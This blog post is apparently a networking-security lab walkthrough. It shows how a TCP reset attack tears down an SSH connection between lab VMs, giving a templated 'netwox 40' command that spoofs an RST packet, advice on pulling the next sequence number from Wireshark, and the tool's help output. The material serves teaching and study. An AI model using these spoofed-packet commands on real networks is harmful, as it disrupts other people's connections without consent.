---
layout: post
title: "TCP Reset Attack on an SSH Connection"
date: 2021-05-25 09:00:00 -0500
categories: Network-Security-&-Defense Attacks
tags: network security ssh tcp attack
---
### Overview
In this demo, we will break an ssh connection between the victim and the ssh server.

### Setup
For this attack you will need 3 Linux VMs.
* VM1 as the victim (SSH client).
* VM2 as the ssh server.
* VM3 as the attacker.

The 3 VMs reside in the same network.

### Attack
The attacker, mimicking the server, only needs to send one RST packet to perform the attack. The requirement is, the attack needs to use "netwox 40" to perform this attack.

The command should be in this format:

```bash
sudo netwox 40 --ip4-src source_ip --ip4-dst destination_ip --tcp-src source_port --tcp-dst destination_port --tcp-rst --tcp-seqnum sequence_number.
```

> **Note**: The attacker needs to use Wireshark to find out the parameter information for the above command: pay attention to the last packet sent from the server to the client, it will tell you what the next sequence number should be.
>
>See here: http://cs.boisestate.edu/~jxiao/cs333/images/tcpreset/nextseqnumber.png.
>
>Also, the next sequence number is always = current sequence number + TCP segment len.

> **Note2**: You can also mimick the client. The attack works in either direction.

Run ```bash netwox 40 --help ``` for help information, like below.

``` bash
seed@VM:~$ netwox 40 --help
Title: Spoof Ip4Tcp packet
Usage: netwox 40 [-c uint32] [-e uint32] [-f|+f] [-g|+g] [-h|+h] [-i uint32] [-j uint32] [-k uint32] [-l ip] [-m ip] [-n ip4opts] [-o port] [-p port] [-q uint32] [-r uint32] [-s|+s] [-t|+t] [-u|+u] [-v|+v] [-w|+w] [-x|+x] [-y|+y] [-z|+z] [-A|+A] [-B|+B] [-C|+C] [-D|+D] [-E uint32] [-F uint32] [-G tcpopts] [-H mixed_data]
Parameters:
 -c|--ip4-tos uint32            IP4 tos {0}
 -e|--ip4-id uint32             IP4 id (rand if unset) {0}
 -f|--ip4-reserved|+f|--no-ip4-reserved IP4 reserved
 -g|--ip4-dontfrag|+g|--no-ip4-dontfrag IP4 dontfrag
 -h|--ip4-morefrag|+h|--no-ip4-morefrag IP4 morefrag
 -i|--ip4-offsetfrag uint32     IP4 offsetfrag {0}
 -j|--ip4-ttl uint32            IP4 ttl {0}
 -k|--ip4-protocol uint32       IP4 protocol {0}
 -l|--ip4-src ip                IP4 src {172.16.77.129}
 -m|--ip4-dst ip                IP4 dst {5.6.7.8}
 -n|--ip4-opt ip4opts           IPv4 options
 -o|--tcp-src port              TCP src {1234}
 -p|--tcp-dst port              TCP dst {80}
 -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
 -r|--tcp-acknum uint32         TCP acknum {0}
 -s|--tcp-reserved1|+s|--no-tcp-reserved1 TCP reserved1
 -t|--tcp-reserved2|+t|--no-tcp-reserved2 TCP reserved2
 -u|--tcp-reserved3|+u|--no-tcp-reserved3 TCP reserved3
 -v|--tcp-reserved4|+v|--no-tcp-reserved4 TCP reserved4
 -w|--tcp-cwr|+w|--no-tcp-cwr   TCP cwr
 -x|--tcp-ece|+x|--no-tcp-ece   TCP ece
 -y|--tcp-urg|+y|--no-tcp-urg   TCP urg
 -z|--tcp-ack|+z|--no-tcp-ack   TCP ack
 -A|--tcp-psh|+A|--no-tcp-psh   TCP psh
 -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
 -C|--tcp-syn|+C|--no-tcp-syn   TCP syn
 -D|--tcp-fin|+D|--no-tcp-fin   TCP fin
 -E|--tcp-window uint32         TCP window {0}
 -F|--tcp-urgptr uint32         TCP urgptr {0}
 -G|--tcp-opt tcpopts           TCP options
 -H|--tcp-data mixed_data       mixed data
 --help2                        display help for advanced parameters
```
